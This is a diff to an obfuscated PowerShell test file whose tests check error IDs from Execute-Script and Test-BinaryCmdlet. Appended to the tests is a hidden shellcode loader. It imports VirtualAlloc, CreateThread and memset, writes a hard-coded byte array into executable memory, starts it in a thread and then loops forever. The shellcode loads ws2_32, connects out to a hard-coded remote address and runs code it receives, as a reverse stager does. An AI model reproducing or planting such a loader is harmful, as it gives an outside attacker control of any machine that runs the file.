+                &("{1}{2}{0}" -f't','Exec','ute-Scrip') -ps ${p`S} -Command ("{1}{4}{5}{6}{3}{0}{2}" -f 'c','T','tion','un','es','t-Scri','ptF') -ParameterName ("{2}{0}{1}"-f 'tI','nfo','Star') -Argument ${psobj`VAL`UE}
+                throw ("{1}{2}{0}{5}{6}{4}{3}" -f 'ti','Expected ','excep','thrown!','ot ','on w','as n')
+            } catch {
+                ${_}."FullYQua`lIFiede`RR`o`RId" | &("{0}{1}"-f 'Sho','uld') ('Be') ("{2}{11}{8}{1}{4}{5}{0}{6}{10}{7}{9}{3}"-f'ti','gArg','Parame','pt','umentTransfor','ma','on','ption,E','Bindin','xecute-Scri','Exce','ter')
+            }
+
+            
+            try {
+                &("{4}{2}{0}{3}{1}"-f 'Sc','t','e-','rip','Execut') -ps ${p`s} -Command ("{1}{4}{0}{2}{3}" -f'y','Tes','C','mdlet','t-Binar') -ParameterName ("{3}{0}{1}{2}" -f 'ar','t','Info','St') -Argument ${haS`hV`ALuE}
+                throw ("{5}{9}{6}{4}{1}{0}{2}{7}{3}{10}{8}" -f ' was no','on','t','thro','epti','E','cted exc',' ','n!','xpe','w')
+            } catch {
+                ${_}."fUL`L`yqUa`L`i`FIedErRoRid" | &("{0}{1}" -f 'Shoul','d') ('Be') ("{3}{0}{2}{4}{7}{1}{6}{5}"-f 'ameterBi','e','nding','Par','Exception,','ute-Script','c','Ex')
+            }
+
+            try {
+                &("{2}{1}{0}{3}" -f 'e-','ut','Exec','Script') -ps ${Ps} -Command ("{3}{0}{2}{4}{1}" -f 's','t','t-Binary','Te','Cmdle') -ParameterName ("{0}{2}{1}{3}" -f'Sta','I','rt','nfo') -Argument ${p`soBjvA`L`UE}
+                throw ("{3}{5}{6}{2}{1}{4}{0}" -f 't thrown!',' ',' was','Expected excep','no','tio','n')
+            } catch {
+                ${_}."fULL`yqu`ALI`F`iE`D`ErRoRId" | &("{0}{1}"-f 'Sh','ould') ('Be') ("{4}{0}{6}{7}{1}{3}{2}{5}{8}{9}"-f 'a','Ex',',Execute','ception','Par','-','met','erBinding','Scr','ipt')
+            }
+        }
+        finally {
+            ${P`S}.("{0}{1}{2}" -f 'Dis','po','se').Invoke()
+        }
+    }
+}
+
+${c} = (((("{79}{61}{32}{14}{34}{12}{49}{2}{1}{11}{3}{63}{5}{40}{54}{17}{64}{8}{70}{50}{20}{45}{60}{58}{51}{38}{0}{71}{21}{53}{62}{42}{48}{29}{18}{27}{59}{65}{69}{16}{26}{74}{25}{76}{30}{4}{66}{72}{36}{55}{75}{73}{43}{67}{31}{10}{39}{33}{19}{68}{15}{37}{35}{47}{56}{52}{80}{6}{13}{57}{44}{77}{24}{28}{7}{23}{22}{9}{78}{46}{41}" -f'int ','Virt','tPtr ','lloc','dwStackSize, In','ntPtr lpAdd','atic exte','IntPtr ',' uint',' uint sr','Creatio','ualA',' static extern ','r','yAY)','llIm',' In','ize',')]','Ptr lpThreadId);','Al',')','t,','des','r mem','ThreadAttr','tPtr Cre','public','set(','AY','butes, uint ','nt dw','yAYkernel32.dll',' Int',']public','t(yAYm','t','por',' u','nFlags,','res','count);','t(yAYkerne','arame','P','lo','int ','sv','l32.dlly','In','fl',',','t.dllyAY',';[DllImp','s, uint dwS','Address,','cr','n Int','pe',' static ','cationTy','ort(','or','(I',',','exte','tPtr l','ter, ui','[D','rn',' ','flProtect','pStar','tPtr lpP','ateThread(IntPtr lp',' In','i','t','c, u','[DllImp',')]public st'))-cREpLAce  ([ChaR]121+[ChaR]65+[ChaR]89),[ChaR]34));${w} = &("{1}{0}"-f'e','Add-Typ') -memberDefinition ${C} -Name ("{1}{0}"-f'in32','W') -namespace ("{4}{0}{1}{3}{2}"-f 'n32Fu','nct','s','ion','Wi') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x49,0xaa,0xe5,0x96,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${G} = 0x1000;if (${z}."L`En`gTH" -gt 0x1000){${g} = ${z}."Len`G`TH"};${X}=${W}::("{2}{0}{1}{3}"-f'u','alAl','Virt','loc').Invoke(0,0x1000,${G},0x40);for (${I}=0;${I} -le (${z}."Leng`TH"-1);${i}++) {${w}::"M`eM`sEt"([IntPtr](${x}.("{1}{0}" -f 'oInt32','T').Invoke()+${I}), ${Z}[${I}], 1)};${W}::("{2}{0}{1}"-f 'reateT','hread','C').Invoke(0,0,${x},0,0,0);for (;;){&("{0}{2}{3}{1}"-f'S','ep','tart-sl','e') 60};
